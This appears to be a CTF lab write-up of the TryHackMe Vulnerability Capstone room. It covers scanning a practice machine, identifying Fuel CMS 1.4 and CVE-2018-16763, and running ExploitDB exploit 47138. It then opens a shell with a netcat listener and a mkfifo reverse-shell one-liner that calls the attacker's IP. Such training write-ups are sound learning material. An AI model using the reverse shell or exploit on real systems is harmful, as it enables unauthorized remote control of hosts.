# Vulnerability-Capstone
![image](https://user-images.githubusercontent.com/86648102/134423991-f97318d7-7f01-4edb-9670-a20a470cb166.png)

* * *

## Task 1 Introduction

Summarise the skills learnt in this module by completing this capstone room for the "Vulnerability Research" module.

> As said above, completing the above rooms, should give you an edge in solving this CTF.

## Task 2 Exploit the Machine (Flag Submission)

**Answer the questions below**

### \- Deploy the vulnerable machine attached to this task & wait five minutes before visiting the vulnerable machine.

- Ping the machine and test initial connectivity to it.

![image](https://user-images.githubusercontent.com/86648102/134403763-834183b0-4794-4515-997e-6c56b7653542.png)

- Start an nmap scan:

`nmap -sC -sV -v -oN Vulnerabilitycapstonenmapscan.txt -p- 10.10.99.108`

The switches I used are:

- -sC: equivalent to --script=default
- -sV: Probe open ports to determine service/version info
- -v: verbose for realtime output
- -oN: output scan in normal format
- -p-: this scans all 65365 ports
    ![dc58c4505d62cf38b92a9e4d422b18e5.png](:/21e6fc889be74738b74352cbc90e0957)

We are dealing with a **Linux Machine**, having the ports **22** and **80** opened.

### \- What is the name of the application running on the vulnerable machine?

From the nmap output, we see the **FUEL CMS** application being as the title of the page:
![a25b1bc0d05595a0a4220978a7d9c65c.png](:/2ceed3d3127a491fbfd8c81fbb61e21d)

> Answer: Fuel CMS

* * *

### \- What is the version number of this application?

By opening the browser and accessing the page we see it quite obvious:
![6ec92b2be8a9475143cee44609109f09.png](:/dffe6808b1f840f886f99feb3d3f7349)

> Answer: Version 1.4

* * *

### What is the number of the CVE that allows an attacker to remotely execute code on this application?

![ec9261365bcd66d30892a3db46c329a3.png](:/0899fa51d6d047d7aee314190d2ecde1)

![5ab10418451dd57a084b9782de1caf42.png](:/846a1facfd074af7a2b5a5f51b9825c3)

> Answer: CVE:[2018-16763](https://nvd.nist.gov/vuln/detail/CVE-2018-16763)

* * *

### Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability.

> Note:There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)

`searchsploit fuel CMS`

We'll use 47138, as it's the one that appeared on ExploitDB too.

![36f7555e501d6e1e9f64b6fd0daea164.png](:/b1a427247f9f400d83d03d0d03ecb76f)

`searchsploit -m linux/webapps/47138.py`

> -m, --mirror \[EDB-ID\] Mirror (aka copies) an exploit to the current working directory

- Now, with the script downloaded, let's edit it and add our ip in:

`sudo vi 47138.py`

![6e2dd961119bac4fa2037ebc22c174d9.png](:/02bfcb3ca0874482806cf1cb21f12588)

After a few tweaks to the script:

`python 47138.py `

![b6a5523166189d5d87b13c6a6e64810f.png](:/f1789b28dc454cc18c172c8cb8dd0b02)

If you want the commands to work, you need to use " "  for them. For instance:

![0c64b8de2836da37daadac7f7781c0bf.png](:/346786e33cbc4df5ada172c8d7ab758d)

I got my inspiration from this blog post for the next steps:

[Unicornsec.com](https://unicornsec.com/home/tryhackme-ignite)

- We want now to get a nice shell on our machine.

1.  Set up a listener on our machine, on port 4567 for instance.

`sudo nc -nvlp 4567`

![071a0676c1dac479d9a9c0ec41b423fc.png](:/775872790c364fac912aa6a1d71432ae)

2\. Get the ip of our machine:

`ip addr show tun0`

![31a1a7af20d16d4c799a314669c20870.png](:/e8cbb9211cce44c59d76941e79b27442)

3\. Use the following command to spawn a shell back to us. Don't forget about the quotes.

`"rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.174.98 4567 >/tmp/f"`

Good, things are moving.

![77cc7b867df3cbb03465c9b6ca10561b.png](:/ec5d4eb24955467ea7111a93d87c8bcb)

`cd /home/ubunbu`

`ls`

`cat flag.txt`

![e4edbc39d594275adceb5cb33b833d66.png](:/6e7e01fab67a43adae6bcae517ca82ff)

This was the last flag.
Congratulations for making it !

* * *




